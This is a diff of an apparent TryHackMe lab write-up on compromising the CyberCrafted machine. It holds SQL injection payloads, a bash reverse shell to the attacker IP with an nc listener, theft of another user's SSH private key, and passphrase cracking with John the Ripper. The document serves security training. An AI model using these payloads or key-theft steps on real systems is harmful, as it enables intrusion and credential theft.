@@ -1,159 +1,222 @@
-Project Description
+📌 Project Overview
 
-I performed network and web enumeration of the target host, which led to the discovery of active services and additional subdomains. I identified a SQL Injection vulnerability in the store search functionality, determined the number of columns in the backend query, and extracted database information using a UNION-based SQL injection.
-
-nmap -p- --min-rate 5000 10.65.142.1
-gobuster dir -u http://store.cybercrafted.thm -w /usr/share/wordlists/dirb/common.txt -x php -t 40
-
-' OR 1=1-- -
-' ORDER BY 4-- -
-' UNION SELECT 1,2,3,4-- -
+In this project, I performed a full attack chain against the CyberCrafted target, starting from network and web enumeration, identifying and exploiting a SQL Injection vulnerability, achieving remote command execution, and progressing into post-exploitation and credential access.
+The engagement demonstrates a realistic web-to-system compromise workflow, including challenges related to secure key exfiltration and cryptographic integrity.
 
 🖥️ Environment
 
-Attacker:
-10.65.82.229 (Kali / AttackBox)
+Attacker Machine
 
-Target:
-10.65.162.153
+IP: 10.65.82.229
 
-Domains:
+OS: Kali Linux / TryHackMe AttackBox
+
+Target Machine
+
+IP: 10.65.162.153
+
+OS: Linux
+
+Discovered Domains
 
 cybercrafted.thm
+
 store.cybercrafted.thm
+
 admin.cybercrafted.thm
 
-1️⃣ Reconnaissance
+1️⃣ Reconnaissance & Enumeration
+Network Scanning
 nmap -p- --min-rate 5000 10.65.162.153
 
 
-Open ports:
+Open Ports Identified
 
 22 — SSH
 
 80 — HTTP
 
-25565 — Minecraft
+25565 — Minecraft Server
 
-➡️ Primary attack vector: HTTP
+➡️ Primary attack surface identified: HTTP (Web Applications)
 
-2️⃣ Initial Access (Web → Reverse Shell)
+Web Enumeration
+gobuster dir -u http://store.cybercrafted.thm \
+-w /usr/share/wordlists/dirb/common.txt -x php -t 40
 
-Command execution achieved via admin panel.
 
+This led to the discovery of accessible endpoints and web functionality related to a store application.
+
+2️⃣ SQL Injection Discovery & Exploitation
+
+While testing the store search functionality, a SQL Injection vulnerability was identified.
+
+Injection Testing
+' OR 1=1-- -
+' ORDER BY 4-- -
+' UNION SELECT 1,2,3,4-- -
+
+Results
+
+Confirmed injectable parameter
+
+Determined the number of columns in the backend query
+
+Successfully used UNION-based SQL injection to extract database information
+
+This vulnerability provided access to administrative functionality hosted on:
+
+admin.cybercrafted.thm
+
+3️⃣ Initial Access — Web to Reverse Shell
+
+From the admin panel, command execution was achieved.
+
+Reverse Shell Payload
 bash -c 'bash -i >& /dev/tcp/10.65.82.229/4444 0>&1'
 
-
-Listener:
-
+Listener
 nc -lvnp 4444
 
-
-Result:
-
+Result
 www-data@cybercrafted:/var/www/admin$
 
-3️⃣ Shell Stabilization
-python3 -c 'import pty; pty.spawn("/bin/bash")'
 
+✔ Successful remote shell as www-data
+
+4️⃣ Shell Stabilization
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo; fg
 export TERM=xterm
 
-4️⃣ Enumeration
+
+This provided a fully interactive TTY shell suitable for post-exploitation.
+
+5️⃣ Post-Exploitation Enumeration
+User Enumeration
 ls /home
 
 
-Users found:
+Discovered Users
 
 cybercrafted
 
 xxultimatecreeperxx
 
-5️⃣ Credential Access — SSH Private Key
-cat /home/xxultimatecreeperxx/.ssh/id_rsa
+6️⃣ Credential Access — SSH Private Key Discovery
 
+During enumeration of the home directories, an encrypted SSH private key was discovered:
 
-Key properties:
+/home/xxultimatecreeperxx/.ssh/id_rsa
+
+Key Characteristics
 
 RSA private key
 
-Encrypted (AES-128-CBC)
+Encrypted using AES-128-CBC
 
-Passphrase protected
-
-➡️ Suitable for ssh2john + John the Ripper
-
-6️⃣ Exfiltration Issue
-
-Manual key copy resulted in:
-
-base64 corruption
-
-incorrect padding
-
-invalid RSA structure
-
-❗ SSH keys must be copied fully and intact.
-
-7️⃣ Cracking Preparation (Failed)
-python3 /opt/john/ssh2john.py id_rsa > id_rsa.hash
-
-8) 🔍 SSH Key Discovery
-
-During the post-exploitation phase, an encrypted RSA private key (id_rsa) was discovered.
-
-Key format:
+Passphrase-protected
 
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC
-...
 
-🔓 Cracking the SSH Key Passphrase
 
-The private key was processed using ssh2john, and then cracked with John the Ripper.
+➡️ This made the key a valid candidate for offline passphrase cracking.
 
+7️⃣ Passphrase Cracking (Successful)
+Key Processing
+python3 /opt/john/ssh2john.py id_rsa > id_rsa.hash
+
+Cracking with John the Ripper
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
 
+Result
 
-📌 Result:
-
-SSH key passphrase:
+✅ Recovered SSH key passphrase
 
 creepin2006
 
-🔐 SSH Access Attempt
-
-An SSH connection attempt was made using the cracked private key:
-
+8️⃣ SSH Authentication Attempt & Issue Encountered
+SSH Login Attempt
 ssh -i id_rsa xxultimatecreeperxx@cybercrafted.thm
 
+Observations
 
 The key correctly prompts for a passphrase ✔
 
-A libcrypto error was encountered, which is not related to the passphrase, but rather to an incorrect or corrupted private key format
+The recovered passphrase is valid
 
+Authentication fails with a cryptographic error
 
-Error:
-
+Error Message
 base64 decoding error: Incorrect padding
+libcrypto error
 
+9️⃣ Root Cause Analysis
 
-Reason: corrupted private key
+The error is not related to the cracked passphrase, but rather indicates:
 
-🧪 Investigation Status
+Corruption of the private key file
 
-During post-exploitation, an encrypted RSA private SSH key belonging to the user xXUltimateCreeperXx was successfully discovered and extracted.
-The passphrase for the key was cracked using ssh2john and John the Ripper (creepin2006).
+Likely caused during manual exfiltration
 
-However, during SSH authentication attempts, the private key triggers libcrypto / invalid format errors, indicating that the key file is likely corrupted during manual exfiltration (base64/padding/format issue).
+Possible issues:
 
-At this stage, the focus is on:
+Truncated base64 data
 
-Re-extracting the SSH private key in a safe, non-destructive way
+Missing or altered lines
+
+Incorrect line wrapping
+
+Copy/paste damage in terminal
+
+❗ SSH private keys are extremely sensitive to formatting and must be copied fully and intact.
+
+🔎 Current Investigation Status
+
+At the current stage:
+
+✔ Encrypted SSH private key successfully discovered
+
+✔ Passphrase cracked (creepin2006)
+
+❌ SSH authentication blocked due to invalid key format
+
+❌ Key integrity compromised during extraction
+
+🎯 Next Steps
+
+The focus moving forward is on:
+
+Re-extracting the SSH private key safely
+
+Using scp, nc, or base64 encoding
 
 Verifying key integrity
 
-Restoring a valid SSH login using the already recovered credentials
+Correct headers, footers, and padding
 
-Further investigation is ongoing to ensure proper key handling and successful SSH access.
+Restoring valid SSH access
+
+Logging in as xxultimatecreeperxx
+
+Continuing towards privilege escalation
+
+🧠 Skills Demonstrated
+
+Network & web enumeration
+
+SQL Injection (UNION-based)
+
+Web-to-system exploitation
+
+Reverse shell handling & stabilization
+
+Linux post-exploitation
+
+SSH key analysis & cracking
+
+Cryptographic error analysis
+
+Real-world key exfiltration pitfalls
